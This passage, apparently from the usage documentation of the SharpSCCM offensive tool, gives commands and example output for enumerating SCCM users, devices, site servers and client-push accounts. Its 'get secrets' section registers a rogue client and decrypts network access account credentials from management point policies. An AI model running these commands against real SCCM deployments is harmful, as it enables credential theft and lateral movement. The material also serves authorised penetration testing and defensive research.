  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT * FROM SMS_UserMachineRelationship WHERE UniqueUserName LIKE '%cave.johnson%'
-----------------------------------
SMS_UserMachineRelationship
-----------------------------------
CreationTime: 20230201182053.447000+000
IsActive: True
RelationshipResourceID: 25165825
ResourceClientType: 1
ResourceID: 16777274
ResourceName: CAVE-JOHNSON-PC
Sources: 4, 9
Types:
UniqueUserName: APERTURE\cave.johnson
-----------------------------------
[+] Completed execution in 00:00:02.8525435
```

Query the SMS Provider (default: check if the current management point is one) for the primary user for the `CAVE-JOHNSON-PC` device:
```
.\SharpSCCM.exe get primary-users -d CAVE-JOHNSON-PC

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT * FROM SMS_UserMachineRelationship WHERE ResourceName='CAVE-JOHNSON-PC'
-----------------------------------
SMS_UserMachineRelationship
-----------------------------------
CreationTime: 20230201182053.447000+000
IsActive: True
RelationshipResourceID: 25165825
ResourceClientType: 1
ResourceID: 16777274
ResourceName: CAVE-JOHNSON-PC
Sources: 4, 9
Types:
UniqueUserName: APERTURE\cave.johnson
-----------------------------------
[+] Completed execution in 00:00:01.0245433
```
---

# get resource-id

### Description
Get the resourceID for a username or device from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
Usage:
  SharpSCCM get resource-id [options]

Options:
  -d, --device <device>                The name of the device to get the ResourceID for (e.g., --device
                                       WORKSTATION1)
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -u, --user <user>                    The UniqueUserName of the user to get a ResourceID for (e.g., --user
                                       CORP\Labadmin)
  -sc, --site-code <site-code>         The three character site code (e.g., PS1) (default: the site code of
                                       the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```

### Examples
Get the resourceId for the device named "SITE-SERVER" from the specified SMS Provider SITE-SMS
```
.\SharpSCCM.exe get resource-id -d SITE-SERVER -sms site-sms

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SITE-MP.MAYYHEM.LOCAL
[+] Site code: PS1
[+] Using provided management point: site-sms
[+] Connecting to \\site-sms\root\SMS\site_PS1
[+] Found resourceID for SITE-SERVER: 16777226
[+] Completed execution in 00:00:00.4430199
```
---

# get naa / get secrets

### Description
Request the machine policy from a management point via HTTP to obtain credentials for network access accounts, collection variables, and task sequences
  
### Requirements
- Domain computer account credentials
    OR
- Local Administrators group membership on a client

### Usage
```
SharpSCCM get secrets [options]

Options:
  -c, --certificate <certificate>             The encoded X509 certificate blob to use that corresponds to a previously
                                              registered device
  -i, --client-id <client-id>                 The SMS client GUID to use that corresponds to a previously registered
                                              device and certificate
  -o, --output-file <output-file>             The path where the policy XML will be written to
  -p, --password <password>                   The password for the specified computer account
  -r, --register-client <register-client>     The name of the device to register as a new client (required when user is
                                              not a local administrator)
  -u, --username <username>                   The name of the computer account to register the new device record with,
                                              including the trailing "$"
  -mp, --management-point <management-point>  The IP address, FQDN, or NetBIOS name of the management point to connect to
                                              (default: the current management point of the client running SharpSCCM)
  -sc, --site-code <site-code>                The three character site code (e.g., PS1) (default: the site code of the
                                              client running SharpSCCM)
  --debug                                     Print debug messages for troubleshooting
  -?, -h, --help                              Show help and usage information
```

### Examples
Use the local computer's self-signed SMS certificate to request policies containing encrypted secrets from the current management point:
```
.\SharpSCCM.exe get secrets

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SITE-SERVER.APERTURE.LOCAL
[+] Site code: PS1
[+] Obtained SMS Signing Certificate from local computer certificates store
[+] Obtained SMS Encryption Certificate from local computer certificates store
[+] Connecting to \\127.0.0.1\root\CCM
[+] Obtained SmsId from local host: GUID:8BCADD46-7EAD-4767-9D54-06AE64756026
[+] Obtaining Full Machine policy assignment from SITE-SERVER.APERTURE.LOCAL PS1
[+] Found 45 policy assignments
[+] Found policy containing secrets:
      ID: {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
      Flags: RequiresAuth, Secret, IntranetOnly, PersistWholePolicy
      URL: http://<mp>/SMS_MP/.sms_pol?{c6fe32fb-7e9c-4776-abe3-2a6d107447f1}.2_00
[+] Adding authentication headers to download request:
      ClientToken: GUID:8BCADD46-7EAD-4767-9D54-06AE64756026;2023-10-26T18:52:50Z
      ClientTokenSignature: 0D47222609505AD599A24FB89E0AC92AA31EFA68C04641A5CA82EAC8922939A8FD0AF31B4625CDDD23963E8AB7DDA875731172D7BCF48EE12D91ABD78DA329A18069C2AFE35534BB6FDC9D1EEEF405689ADEE7D093862B8B54C81DFBBEE7F051B8A4B2470DC849476B23228A90808A4E82290B41C5635756665DE7BBDD218E1941FA7E7285E91FF4BEB7E6936DE82B528B3275099E99605C2C4945F9ED403E8FA7D6AE149558354E2C11E3308ECB96F7673A45B56CF0EF25CAA9233D87D01A4EA0EBCCAB96E32EDB2BC2ED05670B264FCA6C90852E152063D158C8D08240B76617C0F73AF723DDD62A45780222357621EDBC76B0475DBD21D62A098648B3C6BF
[+] Received encoded response from server for policy {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>
NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>

[+] Completed execution in 00:00:00.6209897
```

Use known machine account credentials to create a new device record and request policies containing encrypted secrets from the current management point:
```
.\SharpSCCM.exe get secrets -r newdevice -u chell$ -p <password>

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SITE-SERVER.APERTURE.LOCAL
[+] Site code: PS1
[+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
[+] Reusable Base64-encoded certificate:

    308209D20201033082098E06092A864886F70D010701A082097F0482097B308209773082059006092A864886F70D010701A08205810482057D3082057930820575060B2A864886F70D010C0A0...7C774335FF3E3CFF78303B301F300706052B0E03021A04143E425851728AA802C85337E75D471A47A1C3D9C004147C30C849A46B55FFC1D3A1A2364D506B350C28E9020207D0

[+] Discovering local properties for client registration request
[+] Modifying client registration request properties:
      FQDN: newdevice
      NetBIOS name: newdevice
      Authenticating as: chell$
      Site code: PS1
[+] Sending HTTP registration request to SITE-SERVER.APERTURE.LOCAL:80
[+] Received unique SMS client GUID for new device:

    GUID:72C913C4-F54F-4A07-9EED-918DC07F7EAD

[+] Obtaining Full Machine policy assignment from SITE-SERVER.APERTURE.LOCAL PS1
[+] Found 43 policy assignments
[+] Found policy containing secrets:
      ID: {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
      Flags: RequiresAuth, Secret, IntranetOnly, PersistWholePolicy
      URL: http://<mp>/SMS_MP/.sms_pol?{c6fe32fb-7e9c-4776-abe3-2a6d107447f1}.2_00
[+] Adding authentication headers to download request:
      ClientToken: GUID:72C913C4-F54F-4A07-9EED-918DC07F7EAD;2023-10-26T19:06:06Z
      ClientTokenSignature: 87F9D5EB1F1A951B9C93C569357896169B35CFA0BA3FEB150725B2B30DE7EAC58DA8F64D149ADBD5694BC3BE144B16AAF17D239A63D7035DFDB50B74A8FB66B66965FE8BDBB0AF9785840BED46B4E2471CA00D5C9C4D278206398B5E03228DCC8E9381D7388A5D4AD67BCF03B8E45C1EA538C1639012EC1BA434E0BBAAB6EEE990E9469A7BD275279B86FDB3A4FD2BF701ADCB8416F0797BB461BE15A5B274B373C1FC3347C68C0EB3C1F48B7DD357618E4B875CEE432ACC35321D62A6657E1994D646EB0D4EAFDDEB1F54AC0A2A6E8EE0113EB2761B9B35DF32568787BA23FF3A2A9C5B4A666409C1DEB8C09B597D69B973D807F14C973123B2284766033B70
[+] Received encoded response from server for policy {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>
NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>

[+] Completed execution in 00:00:05.9045603
```
---

# get site-info
### Description
Get information about the site, including the site server name, from a domain controller via LDAP
  
### Requirements
Permitted security roles:
  - DOMAIN\Authenticated Users

### Usage
```
  SharpSCCM_merged get site-info [options]

Options:
  -d, --domain <domain>                       The FQDN of the Active Directory domain to get information from (e.g.,
                                              "aperture.local")
  -sc, --site-code <site-code>                The three character site code (e.g., PS1) (default: the site code of the
                                              client running SharpSCCM)
  --debug                                     Print debug messages for troubleshooting
  --no-banner                                 Do not display banner in command output
  -?, -h, --help                              Show help and usage information
```
### Examples
Query LDAP for principals with Full Control of the System Management container (likely site servers):
```
.\SharpSCCM_merged.exe get site-info -d mayyhem.local

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[!] Found 2 computer account(s) with GenericAll permission on the System Management container:

      MAYYHEM\SITE-SERVER$
      MAYYHEM\CAS$

[+] These systems are likely to be ConfigMgr site servers
[+] Completed execution in 00:00:00.2967762
```

---

# get site-push-settings
### Description
Get automatic client push installation settings from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
SharpSCCM get site-push-settings [options]

Options:
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -sc, --site-code <site-code>         The three character site code (e.g., PS1) (default: the site code of
                                       the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```
### Examples
Get automatic client push installation settings from an SMS Provider via WMI
```
.\SharpSCCM.exe get site-push-settings

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Fallback to NTLM is enabled
[+] Install client software on the following computers:
      Workstations and Servers (excluding domain controllers)
[+] Automatic site-wide client push installation is not enabled
[+] Discovered client push installation account: APERTURE\cave.johnson
[+] The client installed flag is not automatically cleared on inactive clients, preventing automatic reinstallation
[+] Completed execution in 00:00:01.8961712
```

---

# get users
### Description
Get information on users from an SMS Provider via WMI
  
### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
SharpSCCM get users [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -n, --name <name>                        A user to search for (returns all users with names containing the
                                           provided string)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "UniqueUserName DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           UniqueUserName"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query, including escaped backslashes (e.g.,
                                           "UniqueUserName='APERTURE\\cave.johnson'" or "UniqueUserName LIKE
                                           '%cave.johnson%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Query the SMS Provider (default: check if the current management point is one) for users where the name of the user contains "cave":
```
.\SharpSCCM.exe get users -n cave

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT * FROM SMS_R_User WHERE UniqueUserName LIKE '%cave%'
-----------------------------------
SMS_R_User
-----------------------------------
AADTenantID:
AADUserID:
ADObjectCreationTime: 20230103144431.000000+***
AgentName: SMS_AD_USER_DISCOVERY_AGENT, SMS_AD_SECURITY_GROUP_DISCOVERY_AGENT
AgentSite: PS1, PS1
AgentTime: 20230124231501.000000+***, 20230202181130.000000+***
CloudUserId:
CreationDate: 20230124231504.853000+***
DistinguishedName: CN=Cave Johnson,CN=Users,DC=APERTURE,DC=SCI
FullDomainName: APERTURE.SCI
FullUserName: Cave Johnson
Mail:
Name: APERTURE\cave.johnson (Cave Johnson)
NetworkOperatingSystem: Windows NT
ObjectGUID: Can't display UInt8 as a String
PrimaryGroupID: 513
ResourceId: 2063597575
ResourceType: 4
SecurityGroupName: APERTURE\Domain Users
SID: S-1-5-21-3371398565-414029199-3966136581-1103
UniqueUserName: APERTURE\cave.johnson
UserAccountControl: 66048
UserContainerName: APERTURE\USERS
UserGroupName: APERTURE\Domain Users
UserName: cave.johnson
UserOUName:
UserPrincipalName: cave.johnson@APERTURE.SCI
WindowsNTDomain: APERTURE
-----------------------------------
[+] Completed execution in 00:00:00.8389530
```